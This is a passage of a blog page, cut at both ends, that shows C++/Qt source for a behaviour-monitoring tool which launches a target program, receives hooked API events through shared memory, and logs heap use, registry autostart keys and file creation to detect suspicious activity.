class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::NewSocketInfo</span><span class="params">(QString string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	QListWidgetItem* item = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	SYSTEMTIME st;</span><br><span class="line">	<span class="built_in">GetLocalTime</span>(&amp;st);</span><br><span class="line">	<span class="keyword">char</span> temp[<span class="number">150</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">sprintf</span>(temp, <span class="string">&quot;当前时间：%d:%d:%d \n&quot;</span>, st.wMinute, st.wSecond, st.wMilliseconds);</span><br><span class="line">	QString str = QString::<span class="built_in">fromLocal8Bit</span>(temp);</span><br><span class="line">	item-&gt;<span class="built_in">setText</span>(<span class="built_in">QString</span>(str + string));</span><br><span class="line">	SocketException-&gt;<span class="built_in">addItem</span>(item);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::NewHeapBlock</span><span class="params">()</span><span class="comment">//刷新现在界面上的堆信息</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//刷新前先清空</span></span><br><span class="line">	ui.HeapCreateAndDestroy-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	ui.HeapMemoryBlock-&gt;<span class="built_in">clear</span>();</span><br><span class="line">	<span class="comment">//处理堆块</span></span><br><span class="line">	map&lt;string, <span class="keyword">int</span>&gt;::iterator m1;</span><br><span class="line">	<span class="keyword">for</span> (m1 = threadA.HeapBlock.<span class="built_in">begin</span>(); m1 != threadA.HeapBlock.<span class="built_in">end</span>(); m1++)</span><br><span class="line">	&#123;</span><br><span class="line">		QListWidgetItem* item = <span class="keyword">new</span> QListWidgetItem;</span><br><span class="line">		<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="built_in">sprintf</span>(str, <span class="string">&quot;堆块句柄：%s   堆块剩余大小：%d\n&quot;</span>, (*m1).first.<span class="built_in">c_str</span>(), (*m1).second);</span><br><span class="line">		item-&gt;<span class="built_in">setText</span>(QString::<span class="built_in">fromLocal8Bit</span>(str));</span><br><span class="line">		ui.HeapCreateAndDestroy-&gt;<span class="built_in">addItem</span>(item);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//处理堆内存块</span></span><br><span class="line">	map&lt;string, map&lt;string, <span class="keyword">int</span>&gt;&gt;::iterator m2;</span><br><span class="line">	<span class="keyword">for</span> (m2 = threadA.HeapMem.<span class="built_in">begin</span>(); m2 != threadA.HeapMem.<span class="built_in">end</span>(); m2++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (m1 = (*m2).second.<span class="built_in">begin</span>(); m1 != (*m2).second.<span class="built_in">end</span>(); m1++)</span><br><span class="line">		&#123;</span><br><span class="line">			QListWidgetItem* item = <span class="keyword">new</span> QListWidgetItem;</span><br><span class="line">			<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">			<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">			<span class="built_in">sprintf</span>(str, <span class="string">&quot;内存块首地址：%s 所属堆块：%s 大小为：%d\n&quot;</span>, (*m2).first.<span class="built_in">c_str</span>(), (*m1).first.<span class="built_in">c_str</span>(), (*m1).second);</span><br><span class="line">			item-&gt;<span class="built_in">setText</span>(QString::<span class="built_in">fromLocal8Bit</span>(str));</span><br><span class="line">			ui.HeapMemoryBlock-&gt;<span class="built_in">addItem</span>(item);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>M</mi><mi>y</mi><mi>T</mi><mi>h</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>p</mi><mi>p</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;MyThread.cpp\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord">.</span><span class="mord mathdefault">c</span><span class="mord mathdefault">p</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;SoftWareScan.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ui_SoftWareScan.h&quot;</span></span></span><br><span class="line"><span class="keyword">extern</span> info recvinfo;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> typestr[<span class="number">25</span>][<span class="number">20</span>];</span><br><span class="line"><span class="comment">//extern int lastType;</span></span><br><span class="line"><span class="comment">//extern SYSTEMTIME lastST;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyThread::run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> lastType = <span class="number">-1</span>;</span><br><span class="line">	SYSTEMTIME lastST;</span><br><span class="line">	<span class="comment">//GetLocalTime(&amp;lastST);</span></span><br><span class="line">	HANDLE hSemaphore = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">L&quot;mySemaphore&quot;</span>);</span><br><span class="line">	HANDLE hMapFile = <span class="built_in">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(info), <span class="string">L&quot;ShareMemory&quot;</span>);</span><br><span class="line">	LPVOID lpBase = <span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	STARTUPINFOA startupInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION processInformation = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//启动注射器</span></span><br><span class="line">	<span class="comment">/*BOOL bSuccess = CreateProcessA(&quot;C:\\Users\\15242\\source\\repos\\SoftWareScan\\Debug\\App.exe&quot;, filePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;startupInfo, &amp;processInformation);*/</span></span><br><span class="line">	BOOL bSuccess = <span class="built_in">CreateProcessA</span>(<span class="string">&quot;App.exe&quot;</span>, filePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;startupInfo, &amp;processInformation);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//emit newProcessInfo(processInformation);</span></span><br><span class="line">	<span class="function">emit <span class="title">newProcessName</span><span class="params">(QString(fileName))</span></span>;</span><br><span class="line">	<span class="comment">//emit newProcessID(QString::number(processInformation.dwProcessId));</span></span><br><span class="line">	<span class="comment">//emit newProcessHandle(QString::number(processInformation.hProcess));</span></span><br><span class="line">	<span class="keyword">char</span> temp[<span class="number">512</span>];</span><br><span class="line">	<span class="comment">//sprintf(temp, &quot;%d&quot;, processInformation.dwProcessId);</span></span><br><span class="line">	<span class="function">emit <span class="title">newProcessID</span><span class="params">(processInformation.dwProcessId)</span></span>;</span><br><span class="line">	<span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line">	<span class="built_in">sprintf</span>(temp, <span class="string">&quot;%08X&quot;</span>, processInformation.hProcess);</span><br><span class="line">	<span class="function">emit <span class="title">newProcessHandle</span><span class="params">(QString(QLatin1String(temp)))</span></span>;</span><br><span class="line">	<span class="function">emit <span class="title">newStatus</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="built_in">msleep</span>(<span class="number">1500</span>);</span><br><span class="line">	<span class="keyword">while</span> (running)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">WaitForSingleObject</span>(hSemaphore, <span class="number">10</span>) == WAIT_OBJECT_0)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;recvinfo, lpBase, <span class="built_in"><span class="keyword">sizeof</span></span>(info));</span><br><span class="line">			<span class="keyword">if</span> (lastST.wMilliseconds == recvinfo.st.wMilliseconds &amp;&amp; lastST.wSecond == recvinfo.st.wSecond &amp;&amp; lastType == recvinfo.type)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//说明该信息已经接受过，不再添加该信息</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//对收到的消息进行测试</span></span><br><span class="line">			<span class="comment">/*FILE* f = fopen(&quot;test.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">			fprintf(f, &quot;%s\n&quot;, typestr[recvinfo.type]);</span></span><br><span class="line"><span class="comment">			fclose(f);*/</span></span><br><span class="line"></span><br><span class="line">			lastST = recvinfo.st;</span><br><span class="line">			lastType = recvinfo.type;</span><br><span class="line">			<span class="comment">//emit newInfo(recvinfo);</span></span><br><span class="line">			<span class="comment">//审核信息作出判断</span></span><br><span class="line">			<span class="built_in">checkInfo</span>(recvinfo);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">emit <span class="title">newStatus</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="built_in">quit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyThread::StopThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//当点击进程停止后，需要将thread类里面的变量进行重新的设置</span></span><br><span class="line">	running = <span class="literal">false</span>;</span><br><span class="line">	folderset.<span class="built_in">clear</span>();</span><br><span class="line">	filenameset.<span class="built_in">clear</span>();</span><br><span class="line">	filemap.<span class="built_in">clear</span>();</span><br><span class="line">	HeapBlock.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyThread::init</span><span class="params">(<span class="keyword">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	running = <span class="literal">false</span>;</span><br><span class="line">	<span class="built_in">memset</span>(filePath, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(filePath));</span><br><span class="line">	<span class="built_in">memset</span>(fileName, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(fileName));</span><br><span class="line">	<span class="built_in">strcpy</span>(filePath, path);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; filePath[i] != <span class="number">0</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (filePath[i] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">			filePath[i] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">GetFileName</span>(filePath, fileName);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyThread::GetFileName</span><span class="params">(<span class="keyword">char</span>* filepath, <span class="keyword">char</span>* filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(filepath);</span><br><span class="line">	<span class="keyword">while</span> (filepath[len<span class="number">-1</span>]!=<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		len--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">strcpy</span>(filename, filepath + len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MyThread::GetStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> running;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyThread::ModifyProcessStatus</span><span class="params">(<span class="keyword">bool</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	running = status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyThread::checkInfo</span><span class="params">(info tempInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//局部变量</span></span><br><span class="line">	<span class="keyword">int</span> type = tempInfo.type;</span><br><span class="line">	<span class="keyword">unsigned</span> heapHandle;</span><br><span class="line">	<span class="keyword">int</span> handle;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">150</span>];</span><br><span class="line">	<span class="keyword">char</span> filename[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">char</span> filepath[<span class="number">100</span>];</span><br><span class="line">	string copyfolder, s1, s2;</span><br><span class="line">	<span class="keyword">unsigned</span> dwDesiredAccess;</span><br><span class="line">	FILE* f;</span><br><span class="line"></span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (type)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> MESSAGEBOXA:</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MESSAGEBOXW:</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> HEAPCREATE:</span><br><span class="line">		<span class="comment">/*f = fopen(&quot;test.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">		fprintf(f, &quot;成功收到了heapcreate的包！\n&quot;);</span></span><br><span class="line"><span class="comment">		fclose(f);*/</span></span><br><span class="line">		<span class="comment">//创建堆，记录堆句柄和堆大小</span></span><br><span class="line">		s1 = tempInfo.Value[<span class="number">3</span>];<span class="comment">//句柄</span></span><br><span class="line">		handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>);<span class="comment">//大小</span></span><br><span class="line">		HeapBlock.<span class="built_in">insert</span>(pair&lt;string, <span class="keyword">int</span>&gt;(s1, handle));</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="built_in">sprintf</span>(str, <span class="string">&quot;创建了新的堆，堆句柄为 %s  初始大小为  %d&quot;</span>, s1.<span class="built_in">c_str</span>(), handle);</span><br><span class="line">		<span class="function">emit <span class="title">newHeapInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newHeapBlock</span><span class="params">()</span></span>;<span class="comment">//刷新界面信号</span></span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> HEAPFREE:</span><br><span class="line">		s1 = tempInfo.Value[<span class="number">0</span>];<span class="comment">//句柄</span></span><br><span class="line">		s2 = tempInfo.Value[<span class="number">2</span>];<span class="comment">//内存块首地址</span></span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="keyword">if</span> (HeapMem.<span class="built_in">find</span>(s2) == HeapMem.<span class="built_in">end</span>())</span><br><span class="line">		&#123;<span class="comment">//没找到，出错</span></span><br><span class="line">			<span class="built_in">sprintf</span>(str, <span class="string">&quot;内存块首地址为 %s 的堆发生了重复释放！\n&quot;</span>,s2.<span class="built_in">c_str</span>());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">//找到进行释放并更新堆块大小</span></span><br><span class="line">			map&lt;string, <span class="keyword">int</span>&gt; temp2 = (*HeapMem.<span class="built_in">find</span>(s2)).second;</span><br><span class="line">			<span class="keyword">if</span> (temp2.<span class="built_in">find</span>(s1) != temp2.<span class="built_in">end</span>())</span><br><span class="line">			&#123;</span><br><span class="line">				handle = (*temp2.<span class="built_in">find</span>(s1)).second;</span><br><span class="line">				(*HeapBlock.<span class="built_in">find</span>(s1)).second += handle;<span class="comment">//更新堆块大小</span></span><br><span class="line">				HeapMem.<span class="built_in">erase</span>(HeapMem.<span class="built_in">find</span>(s2));</span><br><span class="line">				<span class="built_in">sprintf</span>(str, <span class="string">&quot;成功释放内存块首地址为 %s 的堆区内存！\n&quot;</span>, s2.<span class="built_in">c_str</span>());</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newHeapBlock</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newHeapInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> HEAPDESTROY:</span><br><span class="line">		s1 = tempInfo.Value[<span class="number">0</span>];<span class="comment">//句柄</span></span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="keyword">if</span> (HeapBlock.<span class="built_in">find</span>(s1) == HeapBlock.<span class="built_in">end</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">strcat</span>(str, <span class="string">&quot;销毁堆出错，待销毁的堆不存在！\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			HeapBlock.<span class="built_in">erase</span>(s1);</span><br><span class="line">			<span class="built_in">sprintf</span>(str, <span class="string">&quot;句柄为  %s  的堆块已经被销毁！\n&quot;</span>, s1.<span class="built_in">c_str</span>());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newHeapBlock</span><span class="params">()</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newHeapInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> HEAPALLOC:</span><br><span class="line">		s1 = tempInfo.Value[<span class="number">0</span>];<span class="comment">//句柄</span></span><br><span class="line">		s2 = tempInfo.Value[<span class="number">3</span>];<span class="comment">//内存块首地址</span></span><br><span class="line">		handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>);<span class="comment">//内存块大小</span></span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="keyword">if</span> (HeapBlock.<span class="built_in">find</span>(s1) == HeapBlock.<span class="built_in">end</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//没找到说明申请出错</span></span><br><span class="line">			<span class="comment">//sprintf(str, &quot;句柄为  %s  的堆块不存在！\n&quot;, s1.c_str());</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;<span class="comment">//找到就加入heapmem并对堆块大小变化</span></span><br><span class="line">			(*HeapBlock.<span class="built_in">find</span>(s1)).second -= handle;</span><br><span class="line">			map&lt;string, <span class="keyword">int</span>&gt; temp;</span><br><span class="line">			temp.<span class="built_in">insert</span>(pair&lt;string, <span class="keyword">int</span>&gt;(s1, handle));</span><br><span class="line">			HeapMem.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(s2,temp));</span><br><span class="line">			<span class="built_in">sprintf</span>(str, <span class="string">&quot;已从句柄为 %s 的堆块中申请了 %d 的空间，首地址为 %s\n&quot;</span>, s1.<span class="built_in">c_str</span>(), handle, s2.<span class="built_in">c_str</span>());</span><br><span class="line">			<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">			<span class="function">emit <span class="title">newHeapBlock</span><span class="params">()</span></span>;</span><br><span class="line">			<span class="function">emit <span class="title">newHeapInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> REGCREATEKEYEX:</span><br><span class="line">		handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">		<span class="keyword">if</span> ((handle == <span class="number">0x80000001</span>) &amp;&amp; (<span class="built_in">strstr</span>(tempInfo.Value[<span class="number">1</span>], <span class="string">&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)))</span><br><span class="line">		&#123;</span><br><span class="line">			handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">7</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">			<span class="function">emit <span class="title">newRegInfo</span><span class="params">(handle, QString::fromLocal8Bit(<span class="string">&quot;创建了新的注册键，主键为HKEY_CURRENT_USER，为自启动目录下的注册键！&quot;</span>))</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>((handle==<span class="number">0x80000002</span>)&amp;&amp;(<span class="built_in">strstr</span>(tempInfo.Value[<span class="number">1</span>],<span class="string">&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)))</span><br><span class="line">		&#123;</span><br><span class="line">			handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">7</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">			<span class="function">emit <span class="title">newRegInfo</span><span class="params">(handle, QString::fromLocal8Bit(<span class="string">&quot;创建了新的注册键，主键为HKEY_CURRENT_MACHINE，为自启动目录下的注册键！&quot;</span>))</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">7</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">			<span class="function">emit <span class="title">newRegInfo</span><span class="params">(handle, QString::fromLocal8Bit(<span class="string">&quot;创建了新的注册键，非自启动！&quot;</span>))</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> REGSETVALUEEX:</span><br><span class="line">		handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(str, <span class="string">&quot;修改了该键的名称，修改后的名称为 %s&quot;</span>, tempInfo.Value[<span class="number">1</span>]);</span><br><span class="line">		<span class="function">emit <span class="title">newRegInfo</span><span class="params">(handle, QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> REGOPENKEYEX:</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strstr</span>(tempInfo.Value[<span class="number">1</span>], <span class="string">&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">4</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">			<span class="built_in">sprintf</span>(str, <span class="string">&quot;创建或者打开了注册键  %s  ，位于自启动目录下！&quot;</span>, tempInfo.Value[<span class="number">1</span>]);</span><br><span class="line">			<span class="function">emit <span class="title">newRegInfo</span><span class="params">(handle, QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> REGDELETEVALUE:</span><br><span class="line">		handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(str, <span class="string">&quot;已将值为 %s 的键删除！&quot;</span>, tempInfo.Value[<span class="number">1</span>]);</span><br><span class="line">		<span class="function">emit <span class="title">newRegInfo</span><span class="params">(handle, QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> REGCLOSEKEY:</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CREATEFILE:</span><br><span class="line">		handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">7</span>], <span class="literal">NULL</span>, <span class="number">16</span>);<span class="comment">//创建文件的句柄</span></span><br><span class="line">		<span class="built_in">GetFileName</span>(tempInfo.Value[<span class="number">0</span>], filename);</span><br><span class="line">		<span class="comment">//strcpy(filename, tempInfo.Value[0]);//文件名称</span></span><br><span class="line">		s1 = tempInfo.Value[<span class="number">7</span>];</span><br><span class="line">		<span class="keyword">if</span> (filemap.<span class="built_in">find</span>(s1) == filemap.<span class="built_in">end</span>())</span><br><span class="line">		&#123;<span class="comment">//记录文件句柄和名称</span></span><br><span class="line">			<span class="function">string <span class="title">s2</span><span class="params">(filename)</span></span>;</span><br><span class="line">			filemap.<span class="built_in">insert</span>(pair&lt;string, string&gt;(s1,s2 ));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//Test,测试是否将文件名称和对应句柄存入</span></span><br><span class="line">		<span class="comment">/*f = fopen(&quot;Test.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">		for (auto i = filemap.begin(); i != filemap.end(); i++)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			fprintf(f, &quot;%d   %s\n&quot;, (*i).first, (*i).second.c_str());</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		fprintf(f, &quot;\n&quot;);</span></span><br><span class="line"><span class="comment">		fclose(f);*/</span></span><br><span class="line">		<span class="comment">//结论：成功写入map中，但是读写文件靠的是句柄，每次打开文件句柄不同！但是又要过滤</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">GetLastFolder</span>(tempInfo.Value[<span class="number">0</span>], copyfolder);</span><br><span class="line">		<span class="comment">//判断是否多文件夹操作</span></span><br><span class="line">		<span class="keyword">if</span> (folderset.<span class="built_in">find</span>(copyfolder) == folderset.<span class="built_in">end</span>())</span><br><span class="line">		&#123;<span class="comment">//未找到该文件夹</span></span><br><span class="line">			folderset.<span class="built_in">insert</span>(copyfolder);</span><br><span class="line">		&#125;</span><br><span class="line">		dwDesiredAccess = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="built_in">strcat</span>(str, <span class="string">&quot;创建了文件对象，名称为&quot;</span>);</span><br><span class="line">		<span class="comment">//temp = &quot;创建了文件对象，名称为&quot;;</span></span><br><span class="line">		<span class="comment">//temp2 = filename;</span></span><br><span class="line">		<span class="comment">//temp += temp2;</span></span><br><span class="line">		<span class="comment">//temp += &#x27;\n&#x27;;//加入文件名称信息</span></span><br><span class="line">		<span class="built_in">strcat</span>(str, filename);</span><br><span class="line">		<span class="built_in">strcat</span>(str, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="comment">//判断该文件的操作是否涉及自我复制</span></span><br><span class="line">		<span class="comment">//首先set里面是否存在该名称，没有的话就添加，有的话就可能在自我复制</span></span><br><span class="line">		<span class="comment">//if (filenameset.find(filename) == filenameset.end())</span></span><br><span class="line">		<span 